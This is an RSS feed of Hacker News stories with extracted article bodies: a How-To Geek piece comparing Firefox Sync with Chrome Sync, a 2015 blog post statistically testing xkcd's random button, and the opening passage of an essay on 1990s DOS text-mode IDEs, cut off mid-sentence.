<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 28 Dec 2023 16:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[The Most Compelling Reason to Use Firefox Is Sync That Works (120 pts)]]></title>
            <link>https://www.howtogeek.com/the-best-reason-to-use-firefox-is-sync-that-actually-works/</link>
            <guid>38793414</guid>
            <pubDate>Thu, 28 Dec 2023 13:46:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.howtogeek.com/the-best-reason-to-use-firefox-is-sync-that-actually-works/">https://www.howtogeek.com/the-best-reason-to-use-firefox-is-sync-that-actually-works/</a>, See on <a href="https://news.ycombinator.com/item?id=38793414">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                                                       <div>
                    


        

                        <nav>
                <ul>
                    <li><a href="https://www.howtogeek.com/">Home</a></li>
                                                                                            <li><a href="https://www.howtogeek.com/category/web/">Web</a></li>
                                                                                                                                                            </ul>
            </nav>
            
                </div>
                            

    
            
    
        
            
    
    
    
        
    
                            






            
            

    
    
        
    
            
    
            
    
        
            
    
    
    
        
    
                                
    <p>Firefox's continuity features work better than any browser I've tried.</p>

            
            

    
    
        
    
            
    
            
    
        
            
    
    
    
        
    
                                
                                    
                                                                                                                        
                                                <div data-img-url="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/firefox-hero-1.png" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="&quot;Joe Fedewa \/ How-To Geek&quot;">

        <figure>
            <picture>
                <!--[if IE 9]>
                <video style="display: none;"><![endif]-->
                                    <source media="(min-width: 1024px)" sizes="1140px" srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/firefox-hero-1.png?q=50&amp;fit=contain&amp;w=1140&amp;h=&amp;dpr=1.5">
                                    <source media="(min-width: 768px)" sizes="943px" srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/firefox-hero-1.png?q=50&amp;fit=contain&amp;w=943&amp;h=&amp;dpr=1.5">
                                    <source media="(min-width: 481px)" sizes="767px" srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/firefox-hero-1.png?q=50&amp;fit=contain&amp;w=767&amp;h=&amp;dpr=1.5">
                                    <source media="(min-width: 0px)" sizes="480px" srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/firefox-hero-1.png?q=50&amp;fit=contain&amp;w=480&amp;h=&amp;dpr=1.5">
                                <!--[if IE 9]></video><![endif]-->
                                    <img width="2100" height="1400" alt="Firefox logo." data-img-url="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/firefox-hero-1.png" src="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/firefox-hero-1.png">
                            </picture>
            <figcaption>Joe Fedewa / How-To Geek</figcaption>
        </figure>
    </div>

    
            <!-- No winning ad found for zone: below main pic! -->
    
            
            

    
    
        
    
            
                    </div><div id="article-body" itemprop="articleBody">
<div><h3>Quick Links</h3><ul> <li> <a href="#the-problem-with-chrome-sync">The Problem With Chrome Sync</a> </li> </ul><ul> <li> <a href="#firefox-sync-to-the-rescue">Firefox Sync to the Rescue</a> </li> </ul> </div>
<p>With so much of our digital lives neatly saved and synced in our web browser of choice, the idea of switching to a different one can feel as daunting as moving to a new home. Chrome Sync, in particular, has kept many people using Chrome. However, as good as Chrome Sync is, Firefox Sync is surprisingly better.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":0,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":0,"nbrPlacementsScanned":0,"ruleCount":10,"degradationStartingPoint":1,"actualCount":310} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":1,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":1,"nbrPlacementsScanned":0,"ruleCount":10,"degradationStartingPoint":1,"actualCount":0} -->
<!-- No winning ad found for zone: below first paragraph! -->
<!-- No winning ad found for zone: mid intro! -->
<p>The promise of <a href="https://www.howtogeek.com/408150/how-to-turn-syncing-on-or-off-in-chrome/">Chrome Sync</a> has always been great, and I feel like it lived up to it for a while. As time has gone on, though, I've had more than a few problems with Chrome Sync. Some of the features simply don't work like they should. It ends up be more frustrating than convenient, which completely defeats the purpose. That's why <a href="https://www.howtogeek.com/787392/why-you-should-try-firefox-on-android/">a recent switch to Firefox</a> felt like a breath of fresh air.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":1,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":1,"nbrPlacementsScanned":1,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":403} -->
<!-- No winning ad found for zone: native in content! -->
<h2 id="the-problem-with-chrome-sync"> The Problem With Chrome Sync </h2>
<div data-img-url="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-12-02.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="750px" data-srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-12-02.jpg?q=50&amp;fit=crop&amp;w=750&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-12-02.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-12-02.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-12-02.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="999" height="188" alt="Chrome Sync out of date." data-img-url="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-12-02.jpg" src="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-12-02.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":1,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":1,"nbrPlacementsScanned":1,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":643} -->
<p>As a refresher, <a href="https://www.howtogeek.com/408363/how-to-choose-what-information-to-sync-in-chrome/">Chrome Sync is capable of syncing</a> bookmarks, passwords, browsing history, tabs, payment info, personal info, and settings across devices signed into with the same Google account. That's the idea, at least.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":1,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":1,"nbrPlacementsScanned":1,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":868} -->
<p>The biggest problems I've had with Chrome Sync are history and tabs. I was constantly having issues with Chrome being able to find things in my history from the address bar. I'd start typing the page name into the bar, expecting to see it propagate in the results, and it never would. These were not pages I visited as a one-off, mind you—they appeared in my browsing history many times. Chrome simply wouldn't bring them up.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":1,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":1,"nbrPlacementsScanned":1,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":1311} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":2,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":1,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":0} -->
<p>The Tab Syncing feature worked better, but I found it to be terribly laggy. The idea is to pick up where you left off on a different device. That's hard to do when you get to the other device and the "Tabs From Other Devices" aren't current. The situation gets more annoying when you add in the aforementioned history search woes, making it even more frustrating to find pages.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":2,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":395} -->
<p>Long story short, Chrome's continuity features have felt lacking to me for a while. However, they weren't bad enough to be the reason I tried Firefox. I wasn't expecting Firefox Sync to be any better. To be honest, I assumed these were just common browser annoyances. I was wrong.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":2,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":687} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":2,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":687} -->
<h2 id="firefox-sync-to-the-rescue"> Firefox Sync to the Rescue </h2>
<div data-img-url="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-02-24.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="750px" data-srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-02-24.jpg?q=50&amp;fit=crop&amp;w=750&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-02-24.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-02-24.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-02-24.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="1029" height="430" alt="Firefox history results in address bar." data-img-url="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-02-24.jpg" src="https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/12/2023-12-19_17-02-24.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":2,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":927} -->
<p>On the surface, Firefox Sync seems to be basically the same as Chrome Sync. To set it up, you just need to sign into your devices with the same Mozilla account and choose what you'd like to sync. It's an easy process made even easier with scannable QR codes from Firefox on your mobile devices.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":2,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":1229} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":3,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":2,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":0} -->
<p>The magic of Firefox Sync doesn't have anything to do with the core concept. It's essentially trying to do the same things as Chrome Sync. In my experience, the big difference is it actually works.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":3,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":205} -->
<p>When I type the name of a web page from my history in the Firefox address bar, it shows up. Doesn't matter if I've visited that page a hundred times or only once. If it appears in my history, Firefox will show it to me. That includes history from Firefox on <em>all </em>my devices.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":3,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":486} -->
<p>Tab Syncing is even better. As I'm writing this, I opened a webpage on my computer and immediately grabbed my phone, launched Firefox, opened the tabs, and the page had already synced to "Tabs From Other Devices." I didn't have to wait for anything to sync or manually tap a button to make it happen. To borrow a saying, "It just works." As it should.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":3,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":865} -->
<hr>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":3,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":865} -->
<p>Truly, if you do a lot of switching between devices, you should give Firefox a try. I haven't even mentioned the handy "Tabs From Other Devices" toolbar shortcut you can use on the desktop version or the ability to see other devices from the "<a href="https://support.mozilla.org/en-US/kb/how-set-tab-pickup-firefox-view" rel="noopener noreferrer" target="_blank">Firefox View</a>" screen. I didn't switch to Firefox for syncing features, but it is what's keeping me there.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":3,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":1245} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":4,"startingPoint":0,"skipEvery":null,"nbrPlacementFilledEachSkip":4,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":1,"actualCount":0} -->
 </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How random is xkcd? (2015) (117 pts)]]></title>
            <link>https://hardmath123.github.io/xkcd-random.html</link>
            <guid>38792631</guid>
            <pubDate>Thu, 28 Dec 2023 12:06:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://hardmath123.github.io/xkcd-random.html">https://hardmath123.github.io/xkcd-random.html</a>, See on <a href="https://news.ycombinator.com/item?id=38792631">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="postcontent">
            <section>
                
                <center><em><p>A blatant abuse of statistics.</p>
</em></center>
                <h4>Friday, March 20, 2015 · 6 min read</h4>
<p>Apparently Randall Munroe gets a lot of messages saying that the “random”
button on xkcd is biased.</p>
<blockquote>
<p>2015-03-19 16:47:00    <strong>Hobz</strong>    also, Randall, the random button on the xkcd
frontpage is frustratingly un-random</p>
<p>2015-03-19 18:50:52   <strong>~Randall</strong>    it’s random.</p>
<p>2015-03-19 18:50:59   <strong>~Randall</strong>    people contact me constantly to tell me
that it’s not</p>
<p>2015-03-19 18:51:17   <strong>~Randall</strong>    which is a nice illustration of that mental
bias we have</p>
</blockquote>
<p>I thought I would do a little investigating to see just how random xkcd is.</p>
<hr>
<p>Making consistently random numbers (yes, that sounds weird) is really important
in things like cryptography. Unrandom random numbers can cripple an otherwise
secure network. So there’s a surprisingly large amount of work dedicated to
randomness.</p>
<p>There are services like <a href="http://www.random.org/">random.org</a> which pride
themselves on randomness, and <a href="http://www.fourmilab.ch/hotbits/">HotBits</a>,
which lets you order random bytes that are generated from radioactive decay. A
lot of applications use <code>/dev/urandom/</code>, which is an OS-level random generator
that uses all sorts of sources of entropy such as network noise, CPU heat, and
the current weather in Kansas.</p>
<p>Unfortunately, it’s <em>really</em> hard to tell whether numbers are random or not.
Of course, patterns <a href="http://boallen.com/random-numbers.html">can creep into random
numbers</a>. But more annoyingly, a
glaringly obvious pattern might just be accidental. My favorite example of this
is the <a href="http://en.wikipedia.org/wiki/Feynman_point">Feynman Point</a>, which is a
series of lots of 9s that appears somewhere in the (very unpredictable) decimal
expansion of pi.</p>
<p><img src="http://imgs.xkcd.com/comics/ayn_random.png" alt="xkcd 1277"></p>
<p>There are a bunch of established ways to test the randomness of a random number
generator (such as the excitingly-named <a href="http://en.wikipedia.org/wiki/Diehard_tests">Diehard
tests</a>). They all test for features
that ostensibly random data should have. For example, a random stream of bits
should have almost as many ones as zeros. Not all tests are that obvious,
though, and statistics can be very slippery and unintuitive when it feels like
it.</p>
<p>NIST (the National Institute of Standards and Technology, who deal with things
like how long an inch is and how to backdoor elliptic curves)
<a href="http://csrc.nist.gov/groups/ST/toolkit/rng/documentation_software.html">publishes</a>
a standard for randomness based on such tests, and distributes software that
runs these tests on datasets.</p>
<p>I wrote a Python program to download 10,000 xkcd-random numbers (yay
<code>requests</code>!), and converted them into bitstrings. Then, I fed them to the NIST
Statistical Test Suite.</p>
<p>The results are below:</p>
<pre><code>
------------------------------------------------------------------------------
RESULTS FOR THE UNIFORMITY OF P-VALUES AND THE PROPORTION OF PASSING SEQUENCES
------------------------------------------------------------------------------
   generator is &lt;data/data.xkcd.long&gt;
------------------------------------------------------------------------------
 C1  C2  C3  C4  C5  C6  C7  C8  C9 C10  P-VALUE  PROPORTION  STATISTICAL TEST
------------------------------------------------------------------------------
  5   8   7  13   9   8  13  12  15  10  0.437274    100/100     Frequency
 10  10  11   9  10  16  10   6   8  10  0.759756     99/100     BlockFrequency
  5  12  13  10   7  10  10  10   9  14  0.699313    100/100     CumulativeSums
  8   3  13   9   9  14  13   8  12  11  0.366918     98/100     CumulativeSums
  8  12  11   3   9   8  17  12   9  11  0.224821    100/100     Runs
  7   8   8   6  15   9  12   9  15  11  0.437274     99/100     LongestRun
  7   8   7  16   0  25   0  25   0  12  0.000000 *  100/100     FFT
  3  10   4  19  15   0  18   6  10  15  0.000009 *  100/100     Serial
  9  14  10   2  14   8   6  10  16  11  0.080519    100/100     Serial
 16   1   5   9   6   0   6   0  10  47  0.000000 *   93/100  *  LinearComplexity
</code></pre><p>The important column here is “Proportion”, which shows the pass rate. They’re
all stellar.</p>
<p>If that isn’t convincing, I ran an obviously nonrandom sample for comparison.
This is what NIST’s STS thinks of the first 100,000 bits of Project Gutenberg’s
<a href="http://www.gutenberg.org/dirs/etext98/2ws1610.txt">plaintext version</a> of
<em>Romeo and Juliet</em>:</p>
<pre><code>
------------------------------------------------------------------------------
RESULTS FOR THE UNIFORMITY OF P-VALUES AND THE PROPORTION OF PASSING SEQUENCES
------------------------------------------------------------------------------
   generator is &lt;data/data.rnj&gt;
------------------------------------------------------------------------------
 C1  C2  C3  C4  C5  C6  C7  C8  C9 C10  P-VALUE  PROPORTION  STATISTICAL TEST
------------------------------------------------------------------------------
 95   3   0   1   0   0   1   0   0   0  0.000000 *   25/100  *  Frequency
 55  14  10   6   6   3   1   1   3   1  0.000000 *   64/100  *  BlockFrequency
 94   3   1   0   0   1   1   0   0   0  0.000000 *   28/100  *  CumulativeSums
 93   4   1   1   0   0   0   0   1   0  0.000000 *   30/100  *  CumulativeSums
 51   7  10  10   4   4   2   5   2   5  0.000000 *   61/100  *  Runs
 90   8   1   1   0   0   0   0   0   0  0.000000 *   44/100  *  LongestRun
 92   2   2   2   0   1   0   1   0   0  0.000000 *   23/100  *  FFT
100   0   0   0   0   0   0   0   0   0  0.000000 *    0/100  *  Serial
100   0   0   0   0   0   0   0   0   0  0.000000 *    0/100  *  Serial
 14   2   2   7  11   0   4   0  11  49  0.000000 *   95/100  *  LinearComplexity
</code></pre><p>Much worse.</p>
<p>I encourage you to play with the STS code. It lets you do all sorts of other
neat things, like testing bitstrings for common “templates” and reporting if
too many are found. It also segfaults all over the place, which is actually
very disturbing considering that it’s technically part of the US government’s
computer security project.</p>
<p>In any case, we’ve established that xkcd’s random generator is reasonably
unpredictable and unbiased. As it happens, they’re using the Mersenne Twister,
which is a well-established pseudorandom generation algorithm.</p>
<hr>
<p>So why does the random number generation appear so biased when we’re idly
refreshing on lazy Sunday nights? Part of it is, of course, human nature. We
like to see patterns everywhere.</p>
<p>But here’s a more concrete, mathematical explanation. The conceptual idea is
that in the beginning, hitting “random” is likelier to hit an unread comic, but
once you’ve seen more and more of them, you get repeats. Let’s try to quantify
this: we’re going to calculate the <em>expected value</em> of the number of times you
need to hit “random” until you have seen every single comic. You may have seen
this problem in the context of “how many times do you need to roll a die until
you have rolled all six faces at least once?”.</p>
<p><a href="http://en.wikipedia.org/wiki/Expected_value">Expected value</a> is the average
value of some random variable if you do an experiment lots of times. For
example, if you roll a die gazillions of time, the average number you’ll get is
$ (1+2+3+4+5+6)/6 = 3.5 $, so that’s the <em>expected</em> value.</p>
<p>We’re going to calculate the expected number of times you hit “random” by
calculating the number of times you need to hit it to get the first, second,
third, and (in general) nth unique comic. Then, because of a useful property of
expected values, we can just add them together until $ n = 1500 $ (there are
1500 comics published as of right now) to see how long, as of today, this
process would take.</p>
<p>If you’re looking for your $ n $th unread comic, each time you hit “random”
you have a $ 1 - n/1500 $ chance of getting a fresh one. This is a <a href="http://en.wikipedia.org/wiki/Geometric_distribution">geometric
probability distribution</a>,
which is Math for “you keep trying something with a constant probability until
it succeeds”.  For geometric probability distributions, the expected value is
one over the probability (though I’m not going to prove it here, this
intuitively makes sense: you would expect to have to roll a die around 6 times
until you get your first 1, or to flip a coin twice until you get your first
heads).</p>
<p>Anyhow, for the nth comic, the expected number of clicks is $ 1500/(1500-n) $. Adding
these up for each $ n $, we have this monstrosity:</p>
<p>\[ \sum_{n=1}^{1500} \frac{1500}{n} = \frac{1500}{1500} + \frac{1500}{1499} + \dots + \frac{1500}{2} + \frac{1500}{1} \]</p>
<p>This works out to, on average, 11836 clicks. That’s a lot of clicks.</p>
<p>As common sense dictates, the more times you have clicked “random”, the less
likely it is for you to hit a new comic. And that’s why Randall’s random button
seems biased.</p>
<hr>
<p>One more bit of statistics: if you’ve taken a probability class, you might have
heard of the birthday problem. That is, say you have a party with $ n $ people.
What is the probability that some pair of people at the party share a birthday?</p>
<p>It turns out that if you have just 23 people, the probability is already 50-50.
This is somewhat counterintuitive; most birthday parties only have one birthday
boy! The fallacy is that the problem isn’t asking if some <em>particular</em> person
shares a birthday with someone else. It’s asking if <em>any</em> two people share a
birthday.</p>
<p>The birthday “paradox” turns out to be important in cryptography, especially
when looking for hash collisions. The number of hashes you need to generate
before you hit a collision is similar to the number of people you need at a
party before some pair shares a birthday—much smaller than what you would
expect.</p>
<p>In terms of xkcd-surfing, this helps answer the question “how many times will I
hit random before I see a repeat?”.</p>
<p>There are plenty of good explanations for the math behind the birthday problem
online (<a href="http://mathworld.wolfram.com/BirthdayProblem.html">Wolfram Mathworld</a>
and <a href="http://en.wikipedia.org/wiki/Birthday_problem">Wikipedia</a>)—but if you
don’t believe the number 23 quoted above, it’s worth spending some time trying
to solve it yourself just to understand what’s really going on (it’s not hard).
I’m just going to dump the formula here without any explanation.</p>
<p>For 1500 comics, the probability that you get a repeat after $ k $ clicks is:</p>
<p>\[ 1 - \frac{1500!}{(1500-k)!1500^k} \]</p>
<p>Throwing this at WolframAlpha, we see that after only 45 clicks, you have a
50-50 chance of seeing a duplicate comic. Put a different way, <em>there are even
odds that the last 45 comics you have seen contain a duplicate pair somewhere
in there</em>.</p>
<hr>
<p>So we’ve empirically validated that xkcd’s RNG is as close as we can expect for
something statistically random. We’ve also seen two reasons why it feels
biased.</p>
<p>But on a deeper and much more important level, we’ve seen how counterintuitive
and messy the random-number business is, and how statistical facts can trick us
into seeing patterns that aren’t there.</p>
<hr>
<p>P.S. My methodology for these experiments probably not the best, since I have
no formal statistics background. If you want to check out the code used or a
dump of my dataset, leave a comment below and I’ll send it to you.</p>

            </section>

            

        </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[IDEs we had 30 years ago (191 pts)]]></title>
            <link>https://blogsystem5.substack.com/p/the-ides-we-had-30-years-ago-and</link>
            <guid>38792446</guid>
            <pubDate>Thu, 28 Dec 2023 11:38:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blogsystem5.substack.com/p/the-ides-we-had-30-years-ago-and">https://blogsystem5.substack.com/p/the-ides-we-had-30-years-ago-and</a>, See on <a href="https://news.ycombinator.com/item?id=38792446">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p>I grew up learning to program in the late 1980s / early 1990s. Back then, I did not fully comprehend what I was doing and why the tools I used were impressive given the constraints of the hardware we had. Having gained more knowledge throughout the years, it is now really fun to pick up DOSBox to re-experience those programs and compare them with our current state of affairs.</p><p>This time around, I want to look at the pure text-based IDEs that we had in that era before Windows eclipsed the PC industry. I want to do this because those IDEs had little to envy from the IDEs of today—yet it feels as if we went through a dark era where we lost most of those features for years and they are only resurfacing now.</p><p>If anything, stay for a nostalgic ride back in time and a little rant on “bloat”. But, more importantly, read on to gain perspective on what existed before so that you can evaluate future feature launches more critically.</p><p>In the 1990s, almost every DOS program you ran had a full-screen Text User Interface (TUI) which sported text-based windows, drop shadows, colors, and mouse support. Here is just one example:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png" width="1264" height="948" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:948,&quot;width&quot;:1264,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:70830,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1db3aeed-b831-49f5-a534-34d993bed81e_1264x948.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>The MS-DOS Editor (aka EDIT.COM) with one of its settings dialog open. Note the menu bar, the rich dialog with list selectors and buttons, and the status bar documenting navigation shortcuts.</figcaption></figure></div><p>Each program was its own island because its interface was unique to the program. However, they were all so similar in how they looked like—80x25 characters didn’t leave much room for uniqueness—and how they worked that the differences didn’t really get in the way of usability and discoverability. Once you learned that the Alt key opened the menus and that Tab moved across input fields and buttons, you could navigate almost any program with ease.</p><p><span>But let’s talk about editors. MS-DOS shipped with a TUI text editor since version 5 (1981), which </span><a href="https://blogsystem5.substack.com/p/a-cli-text-editor-in-my-windows" rel="">I previously covered in a recent article</a><span> and is shown above. This editor “worked”, but it was really inconvenient for coding: you needed to exit the editor to compile and run your code, and when you re-ran the editor, you’d have to navigate back to where you were 